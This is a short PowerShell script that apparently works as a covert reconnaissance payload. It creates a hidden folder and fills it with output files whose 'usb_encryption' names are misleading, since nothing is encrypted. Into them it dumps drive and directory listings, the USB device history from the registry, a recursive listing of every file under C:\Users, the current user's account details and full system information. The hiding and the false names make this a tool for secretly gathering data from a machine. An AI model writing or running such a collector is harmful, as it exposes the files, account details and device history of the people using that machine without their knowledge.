$today_date = get-date -format yyyy-MM-dd-T-HH-mm
$txt_file = "usb_encryption" + $today_date
$txt_file_2 = "usb_encryption2_" + $today_date
$txt_file_3 = "usb_encryption3_" + $today_date
$txt_file_4 = "usb_encryption4_" + $today_date
$txt_file_5 = "usb_encryption5_" + $today_date
$txt_file_6 = "usb_encryption6_" + $today_date

$folderName = "usb_encoder"
$root_pwd = (Resolve-Path .\).Path
$current_pwd = Join-Path $root_pwd $folderName 
$Path = Join-Path $current_pwd $txt_file
$Path_2 = Join-Path $current_pwd $txt_file_2
$Path_3 = Join-Path $current_pwd $txt_file_3
$Path_4 = Join-Path $current_pwd $txt_file_4
$Path_5 = Join-Path $current_pwd $txt_file_5
$Path_6 = Join-Path $current_pwd $txt_file_6
  if(!(Test-Path -Path $current_pwd )){
    New-Item $folderName -ItemType Directory | %{$_.Attributes = "hidden"}
  }

Get-ChildItem C:\*\*\ > $Path
Get-ChildItem HKLM:\SYSTEM\ControlSet001\Enum\USBSTOR | Select-Object PSChildname > $Path_2
Get-WmiObject -Class Win32_logicaldisk > $Path_3
Get-ChildItem -Path "C:\Users\" -Recurse | group directory | foreach {$_.group | sort LastWriteTime -Descending} > $Path_4
net user $env:Username > $Path_5
systeminfo > $Path_6
